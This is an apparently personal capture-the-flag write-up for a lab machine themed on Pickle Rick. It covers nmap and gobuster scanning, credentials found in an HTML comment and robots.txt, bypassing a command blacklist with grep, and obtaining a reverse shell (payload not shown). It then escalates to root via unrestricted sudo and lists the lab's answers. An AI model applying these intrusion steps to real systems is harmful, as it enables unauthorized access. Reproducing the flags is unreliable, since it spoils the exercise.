# Overview


# Question-1
```
What is the first ingredient that Rick needs?
```
- Let start by scanning the IP Address `10.10.54.104` with Nmap
### Nmap Results

```bash
┌──(kali㉿kali)-[~]
└─$  nmap -A 10.10.54.104       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-27 08:46 EST
Nmap scan report for 10.10.54.104
Host is up (0.29s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:d1:f5:44:fc:f9:82:e6:94:df:f6:bf:4f:97:0b:62 (RSA)
|   256 29:7f:d0:f1:28:c5:cc:c8:0c:d5:0f:dd:fa:7e:83:2e (ECDSA)
|_  256 5b:00:f3:24:7a:0e:45:39:42:a8:fe:99:75:09:e5:ae (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.43 seconds
```


From the scan result i see a web server is running i.e`port 80` .:
!

There is nothing interesting on the web page so i decide to check the page source:


and Boom i got a very important information(a username) from the HTML comment:

```html
  <!--
    Note to self, remember username!
    Username: R1ckRul3s
  -->
```

Then i decided to brute-force for directories using gobuster and i also added some extension switch to the command:
### Gobuster result

```bash
┌──(kali㉿kali)-[/usr/share/wordlists/dirbuster]
└─$ gobuster dir -u http://10.10.54.104 -w directory-list-2.3-medium.txt -x txt,html,css,cgi,php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.54.104
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              css,cgi,php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 292]
/.php                 (Status: 403) [Size: 291]
/index.html           (Status: 200) [Size: 1062]
/login.php            (Status: 200) [Size: 882]
/assets               (Status: 301) [Size: 313] [--> http://10.10.54.104/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/robots.txt           (Status: 200) [Size: 17]
```

from the output, what i see that robot.txt is available so i use the browser to check if there is any disallow entries:


this is strange robots.txt doesn't contain a string like this, but i note my findings:

```
Wubbalubbadubdub
```

from the Gobuster output we also have a login page i.e `login.php` :
![login1])

because i have no other info and the rest of the pages need a user to be logged in before viewing them i tried the username i got earlier and the string i found from`robots.txt` as the password because there is No harm in trying ): 
![login2]

Boom i am logged in and i was brought to a command panel page(hopefully get RCE or a reverse shell?) i don't know ):
and also i don't have access to other pages, only the command page is available for us:


typing `ls` in the command panel prompt i got the list of files and directory in the current web-root file path `/var/www/html`


then i try to read the first file `Sup3rS3cretPickl3Ingred.txt` but it not working, i use different method of reading file but i am getting same error message, it seems like there is list of commands that can't be executed `blacklist`:


i researched for possible ways to read a file, and found Grep `grep . example.txt` and `grep -R .` :
i used the first grep method to read the the `Sup3rS3cretPickl3Ingred.txt` and i was able to see the first answer(ingredient)


```bash
command: grep . Sup3rS3cretPickl3Ingred.txt

output: mr. meeseek hair
```

i also used the second method of reading files with grep but it returned back the out of all the file `ALL`


it doesn't look nice to read but viewing the page source is much better


from the output of clue.txt `Look around the file system for the other ingredient.`
it will be hard to do that with the limited executable commands.
but scrolling down the source page i found the php code that is actively disallowing some command:


and the list of commands isn't that big so i can work with this.
# Getting a reverse shell
going to [Online-Reverse shell generator](https://www.revshells.com/) i used different payloads but the one that worked is the python3 payload


# Mini-privilege Escalation
running sudo -l and noticed that www-data can run anything with sudo:


then i switched to root with `sudo su` and found the 3rd ingredient in `/root`


```bash
www-data@ip-10-10-54-104:/var/www/html$ sudo su
sudo su
root@ip-10-10-54-104:/var/www/html# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ip-10-10-54-104:/var/www/html# cd /root
cd /root
root@ip-10-10-54-104:~# ls
ls
3rd.txt  snap
root@ip-10-10-54-104:~# cat 3rd.txt
cat 3rd.txt
3rd ingredients: fleeb juice <--- 
root@ip-10-10-54-104:~# 
```

lastly i moved to the /`home/rick` directory and found the second ingredient:


```bash
root@ip-10-10-54-104:~# cd /home
cd /home
root@ip-10-10-54-104:/home# ls
ls
rick  ubuntu
root@ip-10-10-54-104:/home# cd rick
cd rick
root@ip-10-10-54-104:/home/rick# ls
ls
second ingredients
root@ip-10-10-54-104:/home/rick# cat second\ ingredinets
cat second\ ingredinets
cat: 'second ingredinets': No such file or directory
root@ip-10-10-54-104:/home/rick# cat *
cat *
1 jerry tear <---
root@ip-10-10-54-104:/home/rick# 
```



